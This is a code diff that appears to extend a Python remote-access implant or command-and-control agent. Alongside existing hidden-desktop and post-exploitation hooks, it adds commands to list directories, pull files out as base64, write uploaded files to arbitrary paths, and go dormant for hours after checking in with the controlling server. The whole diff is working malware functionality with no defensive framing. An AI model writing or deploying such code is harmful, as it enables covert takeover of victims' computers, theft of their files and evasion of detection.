@@ -80,11 +80,50 @@ def get_metadata():
     }
 
 
+def _handle_fs(command: str) -> str:
+    import os, base64
+    if command.startswith('__fs:ls:'):
+        path = command[8:] or '.'
+        try:
+            entries = []
+            for name in os.listdir(path):
+                full = os.path.join(path, name)
+                try:
+                    st = os.stat(full)
+                    prefix = 'd' if os.path.isdir(full) else '-'
+                    entries.append(f"{prefix} {st.st_size:>12}  {name}")
+                except OSError:
+                    entries.append(f"? {'?':>12}  {name}")
+            return '\n'.join(entries) if entries else 'Directory is empty'
+        except Exception as e:
+            return f"Error: {e}"
+    if command.startswith('__fs:get:'):
+        path = command[9:]
+        if not os.path.isfile(path):
+            return 'Error: not a file'
+        if os.path.getsize(path) > 2 * 1024 * 1024:
+            return 'Error: file too large (>2MB)'
+        return 'FILE:' + base64.b64encode(open(path, 'rb').read()).decode()
+    if command.startswith('__fs:put:'):
+        rest = command[9:]
+        path, _, b64 = rest.partition('\t')
+        data = base64.b64decode(b64)
+        parent = os.path.dirname(path)
+        if parent:
+            os.makedirs(parent, exist_ok=True)
+        with open(path, 'wb') as f:
+            f.write(data)
+        return f'uploaded {len(data)} bytes to {path}'
+    return 'Error: unknown fs command'
+
+
 def execute_command(command: str) -> str:
     if str(command).startswith('__hd:'):
         return hidden_desktop(command)
     if str(command).startswith('__px:'):
         return postex(command)
+    if str(command).startswith('__fs:'):
+        return _handle_fs(command)
     try:
         if command.startswith('cd '):
             directory = command[3:].strip()
@@ -195,6 +234,29 @@ def connect_to_server():
                             continue
                         if command == '__kill':
                             sys.exit(0)
+                        if command.startswith('__dormant:'):
+                            try:
+                                hours = float(command.split(':')[1])
+                                secs = int(hours * 3600)
+                                pending_results.append({
+                                    'type': 'response',
+                                    'output': f'Going dormant for {hours}h ({secs}s)',
+                                    'command': command,
+                                    'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')
+                                })
+                                dormant_msg = {
+                                    'type': 'checkin', 'agent_id': agent_id,
+                                    'metadata': get_metadata(), 'results': pending_results
+                                }
+                                dormant_msg['metadata']['mode'] = 'beacon'
+                                dormant_msg['metadata']['beacon_interval'] = beacon_interval
+                                http_request(f"{BASE_URL}/api/v1/update",
+                                             simple_encrypt(json.dumps(dormant_msg)))
+                                pending_results = []
+                                time.sleep(secs)
+                            except (ValueError, IndexError):
+                                pass
+                            continue
                         if command.startswith('__upgrade_ws:'):
                             try:
                                 ws_data = json.loads(command.split(':', 1)[1])
